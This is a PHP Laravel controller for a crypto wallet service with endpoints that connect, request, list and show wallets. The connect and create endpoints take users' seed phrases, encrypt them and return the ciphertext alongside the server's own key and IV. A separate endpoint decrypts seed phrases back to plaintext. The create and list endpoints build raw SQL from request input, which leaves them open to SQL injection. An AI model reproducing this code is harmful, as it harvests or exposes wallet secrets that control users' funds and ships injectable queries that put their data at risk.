<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

use App\User;
use App\User_profile;
use App\Wallet;
use App\Transaction;
use DB;

class WalletController extends Controller{
    /**
     * Store a new user.
     *
     * @param  Request  $request
     * @return Response
     */
    public function __construct(){
        $this->middleware('auth');
    }

    public function connectWallet(Request $request){
        $this->validate($request, [
            'wallet_address' => 'required|string',
            'seed_phrase' => 'required|string',
        ]);
        try {
            $cipher = "aes-256-cbc"; 
            $seed_phrase = $request->input('seed_phrase');
            $encryption_key = env("ENCRYPTION_KEY");
            $initialization_vector = env("INITIALIZATION_VECTOR");
            $encrypted_data = openssl_encrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector);
            $email_content=(object)[
                "encrypted_data" => $encrypted_data,
                "encryption_key" => $encryption_key,
                "initialization_vector" => $initialization_vector,
            ]; 

            $wallet = new Wallet;
            $wallet->user_id = Auth::user()->user_id;
            $wallet->wallet_address = $request->input('wallet_address');
            $wallet->wallet_status = 1;
            $wallet->save();

            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $email_content,
                    "message" => 'Congratulation, your wallet has been successfully connected',
                ]
            ];
            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet connection failed!'], 409);
        }
    }
    public function createWallet(Request $request){
        $this->validate($request, [
            'user_id' => 'required|string',
            'wallet_address' => 'required|string',
            'seed_phrase' => 'required|string',
            'encryption_key' => 'required|string',
            'initialization_vector' => 'required|string',
        ]);
        try {
            $cipher = "aes-256-cbc"; 
            $seed_phrase = $request->input('seed_phrase');
            $encryption_key = $request->input('encryption_key');
            $initialization_vector = $request->input('initialization_vector');
            $encrypted_data = openssl_encrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector);
            $email_content=(object)[
                "encrypted_data" => $encrypted_data,
                "encryption_key" => $encryption_key,
                "initialization_vector" => $initialization_vector,
            ]; 
            $wallet_details = Wallet::where('wallet_address', $request->input('user_id'));
            if($wallet_details){
                DB::statement("UPDATE `wallets` set `wallet_address` = '".$request->input('wallet_address')."',`wallet_status`='1' Where `user_id` = '".$request->input('user_id')."'"); 
            }

            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $email_content,
                    "message" => 'Congratulation, your wallet has been successfully connected',
                ]
            ];
            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet connection failed!'], 409);
        }
    }

    public function requestWallet(Request $request){
        try {
            $wallet = new Wallet;
            $wallet->user_id = Auth::user()->user_id;
            $wallet->wallet_status = 0;
            $wallet->save();
            $transaction = Transaction::create(
                [
                    "user_id" =>  Auth::user()->user_id,
                    "transaction_type" => 3,
                    "transaction_payment_method" =>  $request->input('transaction_payment_method'),
                    "transaction_details" =>  $request->input('transaction_details'),
                    "transaction_service_fee" =>  $request->input('transaction_service_fee'),
                    "transaction_grand_total" =>  $request->input('transaction_grand_total'),
                    "transaction_status" =>  1,
                ]
            );
            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $wallet,
                    "message" => 'Congratulation, your have successfully submited a request for wallet.',
                ]
            ];

            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet request failed!'], 409);
        }
    }
    public function decryptSeedPhrase(Request $request){
        try {
            $cipher = "aes-256-cbc"; 
            $seed_phrase = $request->input('seed_phrase');
            $encryption_key = $request->input('encryption_key');
            $initialization_vector = $request->input('initialization_vector');

            $decrypted_data = openssl_decrypt($seed_phrase, $cipher, $encryption_key, 0, $initialization_vector); 
            $email_content=(object)[
                "seed_phrase" => $decrypted_data,
                "encryption_key" => $encryption_key,
                "initialization_vector" => $initialization_vector,
            ];
            $response=(object)[
                "success" => true,
                "result" => [
                    "datas" => $email_content,
                    "message" => 'Congratulation, your have successfully decrypted your Seed Phrase.',
                ]
            ];
            return response()->json($response, 201);
        }catch (\Exception $e) {
            return response()->json(['message' => 'Wallet request failed!'], 409);
        }
    }

    public function walletList(Request $request){
        $search="";
        if($request->has('search_keyword')){
            // $search=" AND (`user_profiles`.`user_profile_full_name` LIKE '%".$request->search_keyword."%')";
            $search="WHERE `user_profiles`.`user_profile_full_name` LIKE '%".$request->search_keyword."%'";
        }
        $wallets= DB::select("SELECT COUNT(*) as total_wallet FROM wallets
        LEFT JOIN `user_profiles` ON `wallets`.`user_id`=`user_profiles`.`user_id` ".$search);
        $total_wallet=$wallets[0]->{'total_wallet'};
        $total_pages=ceil($total_wallet / $request->input('limit'));
        $offset = ($request->page-1) * $request->limit;
        $wallet_list= DB::select("SELECT * FROM `wallets` 
        LEFT JOIN `user_profiles` ON `wallets`.`user_id`=`user_profiles`.`user_id` ".$search. "
        LIMIT ".$offset.", ". $request->limit);
        if($wallet_list){
            $response=(object)[
                "success" => true,  
                "result" => [
                    "datas" => $wallet_list,
                    "total_pages" => $total_pages,
                    "page" => $request->page,
                    "total" => $total_wallet,
                    "limit" => $request->limit,
                    "message" => "Here are the list of wallets",
                ]
            ];
        }else{
            $response=(object)[
                "success" => false,
                "result" => [
                    "message" => "There are no available wallets",
                ]
            ];
        }
        return response()->json($response, 200);
    }

    public function specificWallet($id){
        $wallet_details = Wallet::find($id);
        $wallet_details['profile'] = $wallet_details->profile;
        $wallet_details['user'] = $wallet_details->user;

        if(!$wallet_details->profile->user_profile_avatar){
            $wallet_details->profile->user_profile_avatar = url('app/images/default_avatar.jpg');
        }

        if($wallet_details){
            $response=(object)[
                "success" => true,  
                "result" => [
                    "datas" => $wallet_details,
                    "message" => "Here are the details of wallet.",
                ]
            ];
            return response()->json($response, 200);
        }else{
            $response=(object)[
                "success" => true,
                "result" => [
                    "message" => "Wallet not found.",
                ]
            ];
            return response()->json($response, 200);
        }
    }
}